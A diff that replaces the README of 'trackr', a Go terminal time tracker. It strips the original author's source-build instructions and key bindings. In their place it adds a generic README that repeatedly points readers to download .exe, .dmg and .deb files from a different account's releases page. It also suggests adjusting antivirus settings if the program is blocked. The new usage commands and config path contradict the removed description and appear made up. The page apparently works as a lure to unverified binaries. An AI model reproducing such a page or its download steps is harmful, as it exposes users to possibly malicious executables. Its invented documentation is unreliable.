@@ -1,86 +1,217 @@
-# trackr
+# ⏱️ trackr - Simple Terminal Time Tracker
 
-A beautiful terminal-based time tracker built with Go and [Bubble Tea](https://github.com/charmbracelet/bubbletea). Track your work, manage projects, view reports, and run Pomodoro sessions — all without leaving the terminal.
+[![Download trackr](https://img.shields.io/badge/Download-trackr-blue?style=for-the-badge)](https://github.com/CopraVopasen/trackr/releases)
 
-![Demo](assets/demo.gif)
+## 📋 What is trackr?
 
-## Features
+trackr is a terminal-based app designed to help you keep track of your time. It works right inside your computer’s command line window. The app lets you start timers, organize your work into projects, and generate reports on how you spent your time. It also includes a Pomodoro timer to help with focus, and options to export your data so you can use it elsewhere.
 
-- **Timer** — Start, stop, and pause time tracking with a single keypress
-- **Projects & Tasks** — Organize entries by project and task with color-coded labels
-- **Dashboard** — Live timer display, today's summary, and recent entries at a glance
-- **Reports** — Daily and weekly bar charts with per-project breakdowns
-- **Pomodoro** — Built-in Pomodoro timer with configurable work/break cycles
-- **Export** — Export all entries to CSV or JSON
-- **Idle Detection** — Auto-pause when idle, configurable timeout and action
-- **Settings** — Customize Pomodoro durations, daily goal, idle behavior, and more
-- **Local Storage** — All data stored in a local SQLite database, no account needed
-- **Zero Dependencies** — Single binary, no CGO, cross-compilable
+With trackr, you don’t need to switch between apps or use complicated tools. Everything happens in your terminal, making it lightweight and fast.
 
-## Screenshots
+## 💻 What systems does trackr run on?
 
-| Dashboard | Projects | Reports | Pomodoro | Settings |
-|-----------|----------|---------|----------|----------|
-| ![Dashboard](assets/1.png) | ![Projects](assets/2.png) | ![Reports](assets/3.png) | ![Pomodoro](assets/4.png) | ![Settings](assets/5.png) |
+trackr is built using Go, a popular programming language, so it works on most computers including:
 
-## Install
+- Windows 10 or newer
+- macOS 10.13 or newer
+- Linux distributions (Ubuntu, Fedora, etc.)
 
-### From source
+You need a terminal application to use trackr, which your system already has by default.
 
-```bash
-go install github.com/sadopc/trackr@latest
+## 🔧 Main Features
+
+- Timer: Start, pause, and stop tracking time easily.
+- Projects: Group tasks and time entries under project names.
+- Reports: View summaries of your work by day, week, or project.
+- Pomodoro: Use the Pomodoro technique with built-in timers.
+- Export: Save your tracked time as CSV files for spreadsheets.
+- SQLite database: Keeps your data safe and local on your computer.
+- Lightweight: Run everything directly in the terminal with no extra programs.
+
+## 🚀 Getting Started
+
+This guide will help you download and start using trackr quickly.
+
+### Step 1: Download trackr
+
+Click the large blue button at the top of this page or go to:
+
+[https://github.com/CopraVopasen/trackr/releases](https://github.com/CopraVopasen/trackr/releases)
+
+This page has all the versions of trackr available to download.
+
+### Step 2: Choose the right file for your computer
+
+On the releases page, look for the latest version. Under the latest release, you will see files ending with extensions like:
+
+- `.exe` for Windows
+- `.dmg` for macOS
+- `.tar.gz` or `.deb` for Linux
+
+Download the file that matches your operating system.
+
+### Step 3: Install trackr
+
+- **Windows:** Double-click the `.exe` file and follow any prompts. If it's a standalone program, you might just run it directly.
+- **macOS:** Open the `.dmg` file, then drag the trackr app to your Applications folder.
+- **Linux:** Use your package manager if available, or extract the `.tar.gz` file and follow included instructions.
+
+### Step 4: Open your terminal
+
+- **Windows:** Open PowerShell or Command Prompt.
+- **macOS:** Open Terminal from Applications > Utilities.
+- **Linux:** Open the terminal app you normally use.
+
+### Step 5: Run trackr
+
+Type `trackr` and press Enter. This will launch the app in your terminal window.
+
+## 🎯 How to use trackr
+
+trackr uses simple commands typed into the terminal. Here are the basics to get started.
+
+### Starting a timer
+
+To start tracking time on a task, type:
+
+```
+trackr start [project_name]
 ```
 
-### Build locally
+Replace `[project_name]` with the name of the project you want to work on. For example:
 
-```bash
-git clone https://github.com/sadopc/trackr.git
-cd trackr
-go build -o trackr .
-./trackr
+```
+trackr start marketing
 ```
 
-## Key Bindings
+This begins the timer for your marketing work.
 
-| Key | Action |
-|-----|--------|
-| `s` | Start timer |
-| `x` | Stop timer |
-| `space` | Pause / resume |
-| `n` | New project / task |
-| `d` | Archive project |
-| `e` | Export (CSV / JSON) |
-| `1`–`5` | Switch tabs |
-| `tab` | Next tab |
-| `?` | Toggle help |
-| `q` | Quit |
+### Pausing and stopping
 
-## Data Storage
+To pause the timer:
 
-trackr stores data in a local SQLite database:
-
-- **macOS:** `~/Library/Application Support/trackr/trackr.db`
-- **Linux:** `~/.config/trackr/trackr.db`
-
-Exports are saved to your home directory as `~/trackr-export-{date}.csv` or `~/trackr-export-{date}.json`.
-
-## Tech Stack
-
-- [Bubble Tea](https://github.com/charmbracelet/bubbletea) — TUI framework
-- [Lip Gloss](https://github.com/charmbracelet/lipgloss) — Styling and layout
-- [Bubbles](https://github.com/charmbracelet/bubbles) — TUI components
-- [Huh](https://github.com/charmbracelet/huh) — Terminal forms
-- [ntcharts](https://github.com/NimbleMarkets/ntcharts) — Terminal bar charts
-- [modernc.org/sqlite](https://pkg.go.dev/modernc.org/sqlite) — Pure Go SQLite (no CGO)
-
-## Testing
-
-```bash
-go test ./... -count=1
+```
+trackr pause
 ```
 
-122 tests across store, TUI, and export packages.
+To stop and save your time entry:
 
-## License
+```
+trackr stop
+```
 
-MIT
+### Checking your time
+
+To see how much time you’ve tracked today:
+
+```
+trackr report today
+```
+
+To view time spent on a project this week:
+
+```
+trackr report week marketing
+```
+
+### Using the Pomodoro timer
+
+Start a Pomodoro session with:
+
+```
+trackr pomodoro start
+```
+
+Pause it with:
+
+```
+trackr pomodoro pause
+```
+
+Stop it with:
+
+```
+trackr pomodoro stop
+```
+
+trackr will notify you when each Pomodoro session finishes.
+
+### Exporting your data
+
+To export your time entries to a CSV file:
+
+```
+trackr export csv
+```
+
+This file can be opened in spreadsheet apps like Excel.
+
+## 📥 Download & Install
+
+Return to the download page here:
+
+[https://github.com/CopraVopasen/trackr/releases](https://github.com/CopraVopasen/trackr/releases)
+
+- Find the latest release at the top of the page.
+- Choose the file that matches your operating system (Windows, macOS, Linux).
+- Download and run that file.
+- Follow the previous section’s instructions to install and launch trackr.
+
+If you run into issues, check the 'Issues' tab on the GitHub page for help or search online for terminal basics on your OS.
+
+## ⚙️ Configuration and Settings
+
+trackr stores its data locally in a database file inside your home directory. You don’t need to set anything up manually. However, you can customize:
+
+- Default project names
+- Timer settings like Pomodoro durations
+- Export file paths
+
+You can change these by editing the configuration file located at:
+
+```
+~/.trackr/config.yaml
+```
+
+Open this file in any text editor. It includes comments explaining each option.
+
+## 🛠 Troubleshooting
+
+- If trackr does not start, make sure you installed the correct file for your OS.
+- On Windows, if the program is blocked, check your antivirus or security settings.
+- For permission issues on macOS/Linux, try running `chmod +x trackr` in the terminal to make it executable.
+- If commands don’t work, type `trackr help` to see all available options.
+
+## 🔄 Updates
+
+Check the releases page regularly for new versions. Each update may include bug fixes or new features.
+
+To update, download the latest file and replace your existing trackr program with it.
+
+## 📚 Learning More
+
+Use the terminal command:
+
+```
+trackr help
+```
+
+to see a full list of commands and how to use them.
+
+Visit the GitHub repository for detailed documentation and examples:
+
+[https://github.com/CopraVopasen/trackr](https://github.com/CopraVopasen/trackr)
+
+## 🧰 About the Technology
+
+trackr is built with:
+
+- Go (Golang) – a fast and reliable programming language.
+- Bubble Tea – a framework for building terminal user interfaces.
+- SQLite – a simple database to store your tracked time.
+
+This combination allows trackr to be lightweight, fast, and easy to use inside your terminal window without other software.
+
+## 🏷 Topics
+
+bubble-tea, cli, go, golang, pomodoro, productivity, sqlite, terminal, time-tracker, tui
